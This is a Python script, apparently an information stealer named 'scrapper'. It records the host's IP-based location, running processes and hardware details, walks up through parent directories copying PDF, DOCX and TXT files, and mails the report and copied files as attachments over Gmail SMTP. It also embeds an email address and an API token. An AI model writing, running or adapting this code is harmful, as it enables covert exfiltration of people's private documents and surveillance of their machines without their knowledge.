import subprocess
import platform
import psutil
import requests
import os
import psutil
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

# Set to False if you just want the system_info.txt instead of having an email sent as well
enable_email = True

# Provide email configuration (replace with actual values)
sender_email = "johndoe029501@gmail.com"
receiver_email = ""
password = ""
smtp_server = "smtp.gmail.com"
smtp_port = 587
max_attachment_size_mb = 25  # Gmail attachment size limit in MB
max_copy_amount = 25 # Max amount of files to copy in MB

def get_os_info():
    return platform.platform()

def get_system_details():
    details = {
        "computer_type": platform.machine(),
        "cpu_type": platform.processor(),
    }

    details["gpu_info"] = get_gpu_info()
    
    if platform.system() == "Windows":
        try:
            model = subprocess.check_output("wmic csproduct get name", universal_newlines=True)
            details["computer_model"] = model.split("\n")[1].strip()
        except Exception as e:
            details["computer_model"] = "Unknown"
    
    elif platform.system() == "Darwin":
        try:
            model = subprocess.check_output(["system_profiler", "SPHardwareDataType"], universal_newlines=True)
            for line in model.split("\n"):
                if "Model Name" in line or "Model Identifier" in line:
                    details["computer_model"] = line.split(":")[1].strip()
                    break
        except Exception as e:
            details["computer_model"] = "Unknown"
    
    else:
        details["computer_model"] = "Not Specified"
    
    return details

def get_gpu_info():
    """Retrieve GPU information based on the operating system."""
    os_system = platform.system()
    try:
        if os_system == "Windows":
            gpu_info = subprocess.check_output("wmic path win32_VideoController get name", universal_newlines=True)
        elif os_system == "Linux":
            gpu_info = subprocess.check_output("lspci | grep VGA", shell=True, universal_newlines=True)
        elif os_system == "Darwin":
            gpu_info = subprocess.check_output("system_profiler SPDisplaysDataType", shell=True, universal_newlines=True)
        else:
            gpu_info = "Unsupported OS for GPU Info"
    except Exception as e:
        gpu_info = f"Error retrieving GPU Info: {e}"
    return gpu_info

def get_running_processes():
    running_processes = psutil.process_iter(['pid', 'name', 'username'])
    process_info = []
    for proc in running_processes:
        process_info.append({
            "PID": proc.info['pid'],
            "Name": proc.info['name'],
            "Username": proc.info['username']
        })
    return process_info

def get_location_from_api(api_token):
    try:
        response = requests.get(f'https://ipinfo.io?token={api_token}')
        location_data = response.json()
        return location_data
    except Exception as e:
        return {"error": str(e)}

def send_email(sender_email, receiver_email, password, smtp_server, smtp_port, message):
    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())
        print("Email sent successfully!")
        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")

def send_email_with_attachments(sender_email, receiver_email, password, smtp_server, smtp_port, attachments, subject, system_info_path):
    part_number = 1
    total_size = 0
    email_count = 0
    message = None
    system_info_added = False

    for attachment in attachments:
        attachment_path = attachment["path"]
        attachment_name = os.path.basename(attachment_path)
        attachment_size = attachment["size"]

        if not message:
            # Initialize the first email message
            message = MIMEMultipart()
            message["From"] = sender_email
            message["To"] = receiver_email
            message["Subject"] = f"{subject} - Part {part_number}"
            message.attach(MIMEText("Please find attached the system information report.", "plain"))

        if not system_info_added:
            with open(system_info_path, "rb") as file:
                attachment_data = MIMEApplication(file.read(), _subtype="text")
                attachment_data.add_header("Content-Disposition", "attachment", filename="system_info.txt")
                message.attach(attachment_data)
                total_size += os.path.getsize(system_info_path)
            system_info_added = True  

        # Check if adding this attachment will exceed the size limit
        if total_size + attachment_size > max_attachment_size_mb * 1024 * 1024:
            # Send the current batch of attachments
            send_email(sender_email, receiver_email, password, smtp_server, smtp_port, message)
            email_count += 1
            total_size = 0
            part_number += 1
            message = None

        if message:
            # Attach the file to the current message
            with open(attachment_path, "rb") as file:
                attachment_data = MIMEApplication(file.read(), _subtype="zip")
                attachment_data.add_header("Content-Disposition", "attachment", filename=attachment_name)
                message.attach(attachment_data)
                total_size += attachment_size

    # Send the final batch of attachments if any
    if message:
        send_email(sender_email, receiver_email, password, smtp_server, smtp_port, message)
        email_count += 1

    print(f"Total emails sent: {email_count}")

def prepare_attachments(copied_files_dir):
    attachments = []

    if os.path.exists(copied_files_dir) and os.listdir(copied_files_dir):
        for root, dirs, files in os.walk(copied_files_dir):
            for file in files:
                file_path = os.path.join(root, file)
                file_size = os.path.getsize(file_path)
                attachments.append({"path": file_path, "size": file_size})
    return attachments


def scrapper():
    with open("system_info.txt", "w") as file:
        location_info = get_location_from_api('02d299854c35db')
        file.write("\nIP-based Location Information (from API):\n\n")
        for key, value in location_info.items():
            file.write(f"{key}: {value}\n")
        file.write("\n============================\n")
    
        current_dir = os.getcwd()
        script_dir = os.path.dirname(os.path.abspath(__file__))
        file.write(f"\nCurrent Directory: {current_dir}\n\n")

        copied_files_dir = os.path.join(current_dir, 'copied_files')
        if not os.path.exists(copied_files_dir):
            os.makedirs(copied_files_dir)

        total_size = 0
        while True:
            try:
                # Attempt to move to the parent directory
                os.chdir('..')
                prev_dir = os.getcwd()
                if prev_dir == current_dir:
                    break  # Stop if we can't go back further
                file.write("============================\n")
                file.write(f"Previous Directory: {prev_dir}\n\n")
                file.write(f"Files in {prev_dir}:\n\n")
                file_list = os.listdir(prev_dir)
                for item in file_list:
                    if total_size <= max_copy_amount * 1024 * 1024:
                        if item.endswith('.pdf') or item.endswith('.docx') or item.endswith('.txt'):
                            src_file_path = os.path.join(prev_dir, item)
                            dst_file_path = os.path.join(copied_files_dir, item)
                            shutil.copy(src_file_path, dst_file_path)
                            total_size += os.path.getsize(src_file_path)
                    file.write(f"{item}\n")
                file.write("\n")
                current_dir = prev_dir
            except Exception as e:
                file.write(f"Error: {str(e)}\n")
                break  # Stop if there's an error
        file.write("\n============================\n")

        file.write("Running Processes:\n\n")
        running_processes = get_running_processes()
        for proc in running_processes:
            file.write(f"PID: {proc['PID']}, Name: {proc['Name']}, User: {proc['Username']}\n\n")
        
        file.write("\n============================\n")
        file.write("System Information:\n")
        os_info = get_os_info()
        system_details = get_system_details()
        file.write(f"Operating System: {os_info}\n")
        for key, value in system_details.items():
            file.write(f"{key}: {value}\n")
            if key == "gpu_info":
                gpu_lines = value.strip().split('\n')
                for line in gpu_lines:
                    file.write(f"GPU: {line.strip()}\n")

    if enable_email:
        # Prepare attachments from copied_files directory
        copied_files_dir = os.path.join(script_dir, 'copied_files')
        system_info_dir =  os.path.join(script_dir, 'system_info.txt')
        attachments = prepare_attachments(copied_files_dir)

        if not attachments:
            print("No files to send.")
            return
        
        send_email_with_attachments(sender_email, receiver_email, password, smtp_server, smtp_port, attachments, "System Information Report", system_info_dir)

if __name__ == "__main__":
    scrapper()
